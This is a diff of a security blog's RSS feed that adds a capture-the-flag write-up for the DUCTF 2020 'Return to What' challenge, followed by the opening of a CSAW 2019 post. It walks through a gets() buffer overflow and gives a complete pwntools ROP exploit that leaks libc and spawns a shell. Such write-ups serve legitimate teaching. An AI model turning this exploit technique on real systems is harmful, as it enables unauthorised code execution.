@@ -1,4 +1,225 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Anubis</title><link>https://anvbis.github.io/posts/</link><description>Recent content in Posts on Anubis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Sun, 15 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>CSAW 2019 :: Smallboi</title><link>https://anvbis.github.io/posts/csaw-2019-smallboi/</link><pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/csaw-2019-smallboi/</guid><description>Reverse Engineering Like usual, we&amp;rsquo;ll start by running file to get a brief overflow of the executable&amp;rsquo;s architecture. Note that it is a 64-bit linux executable.
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Anubis</title><link>https://anvbis.github.io/posts/</link><description>Recent content in Posts on Anubis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Mon, 16 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>DUCTF 2020 :: Return to What</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-what/</link><pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-what/</guid><description>Reverse Engineering We&amp;rsquo;ll start by running file to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.
+$ file return-to-what return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped Running pwntools' checksec tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&amp;rsquo;t execute shellcode on the stack, we&amp;rsquo;ll at least be able to access any part of the executable.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
+<p>We&rsquo;ll start by running <code>file</code> to get an idea of the executable&rsquo;s architecture and platform. Note that it is a 64-bit linux executable.</p>
+<pre><code>$ file return-to-what 
+return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped
+</code></pre><p>Running pwntools' <code>checksec</code> tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&rsquo;t execute shellcode on the stack, we&rsquo;ll at least be able to access any part of the executable.</p>
+<pre><code>$ checksec return-to-what                                                                                  130 ⨯
+[*] './return-to-what'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>Running the executable reveals that it&rsquo;s only functionality is to accept user input, prior to exiting. It&rsquo;s likely that we&rsquo;ll find a vulnerability of some sort here.</p>
+<pre><code>$ ./return-to-what 
+Today, we'll have a lesson in returns.
+Where would you like to return to?
+asdf
+</code></pre><p>Disassembly the executable shows us that it contains two important functions. The <code>main</code> function, which calls a function called <code>vuln</code>. The <code>vuln</code> function makes a <code>gets</code> call, we&rsquo;ve found a buffer overflow.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s;
+    
+    puts(<span style="color:#e6db74">&#34;Where would you like to return to?&#34;</span>);
+    gets(<span style="color:#f92672">&amp;</span>s);
+    <span style="color:#66d9ef">return</span>;
+}
+
+undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+{
+    puts(<span style="color:#e6db74">&#34;Today, we</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">ll have a lesson in returns.&#34;</span>);
+    vuln();
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Since the executable doesn&rsquo;t leak any import information to us (such as a <code>libc</code> address), we&rsquo;ll have to find a way to leak something ourselves.</p>
+<p>Looking at the imported functions, we can see an entry for <code>puts</code>. With this we should be able to do a classic <code>libc</code> leak with <code>puts(puts)</code>, more on that later.</p>
+<pre><code>pwndbg&gt; info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x0000000000401030  puts@plt
+0x0000000000401040  gets@plt
+0x0000000000401050  setvbuf@plt
+0x0000000000401060  _start
+0x0000000000401090  _dl_relocate_static_pie
+0x00000000004010a0  deregister_tm_clones
+0x00000000004010d0  register_tm_clones
+0x0000000000401110  __do_global_dtors_aux
+0x0000000000401140  frame_dummy
+0x0000000000401142  setup
+0x0000000000401185  vuln
+0x00000000004011ad  main
+0x00000000004011d0  __libc_csu_init
+0x0000000000401230  __libc_csu_fini
+0x0000000000401234  _fini
+</code></pre><p>Before going any further, let&rsquo;s find the offset of the <code>puts</code> function within <code>libc</code>. Below is a few GDB commands that achieves this goal.</p>
+<p>Here&rsquo;s what we&rsquo;re doing:</p>
+<ul>
+<li>Printing the process map to get the start address of <code>libc</code>.</li>
+<li>Getting the address of <code>puts</code>.</li>
+<li>Subtracting the start address of <code>libc</code> from <code>puts</code> to get the offset.</li>
+</ul>
+<pre><code>pwndbg&gt; info proc map
+process 1968
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+...
+      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+...
+pwndbg&gt; p puts
+$4 = {int (const char *)} 0x7ffff7e655f0 &lt;__GI__IO_puts&gt;
+pwndbg&gt; p/x 0x7ffff7e655f0-0x7ffff7def000
+$5 = 0x765f0
+</code></pre><p>There are a few more things we need to find before we can write our shellcode, mainly:</p>
+<ul>
+<li>A <code>pop rdi</code> instruction, so we can leak <code>libc</code>.</li>
+<li>The &lsquo;magic&rsquo; gadget, so we can get a shell.</li>
+</ul>
+<p>We can use the <code>ropper</code> tool to find a <code>pop rdi</code> instruction, easily found within the executable.</p>
+<pre><code>$ ropper --file ./return-to-what --search 'pop rdi'
+[INFO] Load gadgets for section: LOAD
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rdi
+
+[INFO] File: ./return-to-what
+0x000000000040122b: pop rdi; ret;
+</code></pre><p>Using the <code>one_gadget</code> tool, we can find a &lsquo;magic&rsquo; gadget that&rsquo;ll immediately give us a shell, provided we meet the conditions. We just need a rop gadget that will help us set this up.</p>
+<pre><code>$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0xcbd1a execve(&quot;/bin/sh&quot;, r12, r13)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [r13] == NULL || r13 == NULL
+
+0xcbd1d execve(&quot;/bin/sh&quot;, r12, rdx)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xcbd20 execve(&quot;/bin/sh&quot;, rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+</code></pre><p>The &lsquo;magic&rsquo; gadget I like the most is the first one, so let&rsquo;s find a gadget that&rsquo;ll set this up. We&rsquo;ll use <code>ropper</code> again.</p>
+<pre><code>$ ropper --file ./return-to-what --search 'pop r12'
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop r12
+
+[INFO] File: ./return-to-what
+0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
+</code></pre><h2 id="information-gathering">Information Gathering</h2>
+<p>Now that we&rsquo;ve found everything we need, we can do a little more information gathering to get the last thing we need for our exploit - the offset of the return address from our input buffer.</p>
+<p>Here&rsquo;s a quick script that&rsquo;ll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./return-to-what&#39;</span>)
+gdb<span style="color:#f92672">.</span>attach(r)
+
+r<span style="color:#f92672">.</span>clean()
+r<span style="color:#f92672">.</span>writeline(cyclic(<span style="color:#ae81ff">100</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))
+
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>After continuing in GDB and letting the program crash, we can see what was stored in the return address.</p>
+<pre><code> ► 0x4011ac &lt;vuln+39&gt;    ret    &lt;0x6161616161616168&gt;
+</code></pre><p>Using pwntools' <code>cyclic_find</code> function, we can use the value we found above to calculate the offset of the return address from our input buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6161616161616168</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
+Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">56</span>
+</code></pre></div><h2 id="exploit-development">Exploit Development</h2>
+<p>Now that we have everything we need, we can begin to write our exploit. There&rsquo;s quite a few things that we need to achieve, here&rsquo;s a list:</p>
+<ul>
+<li>Overwrite the return address to get control of process execution.</li>
+<li>Use <code>puts</code> to print the value of <code>puts</code> stored in the global offset table (a <code>libc</code> address).</li>
+<li>Capture the leaked <code>libc</code> address, and subtract the offset of the <code>puts</code> address to get the start address of <code>libc</code>.</li>
+<li>Use the leaked <code>libc</code> address to redirect process execution to our &lsquo;magic&rsquo; gadget to get a shell.</li>
+</ul>
+<p>Keep in mind that we need to setup carefully for the &lsquo;magic&rsquo; gadget, as it&rsquo;ll only execute under specific circumstances.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
+
+
+pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span>
+
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">0x000000000040122b: pop rdi; ret;
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x040122b</span>
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+setup <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0401224</span>
+
+
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./return-to-what&#39;</span>)
+
+
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./return-to-what&#39;</span>)
+rop <span style="color:#f92672">=</span> ROP(elf)
+
+<span style="color:#75715e"># pop rdi; ret</span>
+rop<span style="color:#f92672">.</span>raw(pop_rdi)
+rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#75715e"># pop rdi</span>
+
+<span style="color:#75715e"># puts</span>
+rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#75715e"># puts(puts)</span>
+
+<span style="color:#75715e"># main</span>
+rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>])
+
+r<span style="color:#f92672">.</span>clean()
+r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain())
+
+leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>readline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+leak <span style="color:#f92672">=</span> unpack(leak, len(leak) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
+libc <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x765f0</span>
+
+magic <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xcbd1a</span>
+
+
+rop <span style="color:#f92672">=</span> ROP(elf)
+
+<span style="color:#75715e"># setup </span>
+rop<span style="color:#f92672">.</span>raw(setup)
+rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r12</span>
+rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r13</span>
+rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r14</span>
+rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r15</span>
+
+<span style="color:#75715e"># magic gadget</span>
+rop<span style="color:#f92672">.</span>raw(magic)
+
+r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain())
+
+
+r<span style="color:#f92672">.</span>clean()
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>And finally, here&rsquo;s our exploit in action. It gives us an interactive shell that we can use to read the flag.</p>
+<pre><code>$ ./exploit.py
+[+] Starting local process './return-to-what': pid 2145
+[*] './return-to-what'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Loaded 14 cached gadgets for './return-to-what'
+[*] Switching to interactive mode
+$ cat flag.txt
+DUCTF{ret_pUts_ret_main_ret_where???}
+$ 
+[*] Stopped process './return-to-what' (pid 2145)
+</code></pre>]]></content></item><item><title>CSAW 2019 :: Smallboi</title><link>https://anvbis.github.io/posts/csaw-2019-smallboi/</link><pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/csaw-2019-smallboi/</guid><description>Reverse Engineering Like usual, we&amp;rsquo;ll start by running file to get a brief overflow of the executable&amp;rsquo;s architecture. Note that it is a 64-bit linux executable.
 $ ./small_boi ./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped Running checksec reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won&amp;rsquo;t be able to execute any shellcode on the stack.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
 <p>Like usual, we&rsquo;ll start by running <code>file</code> to get a brief overflow of the executable&rsquo;s architecture. Note that it is a 64-bit linux executable.</p>
 <pre><code>$ ./small_boi
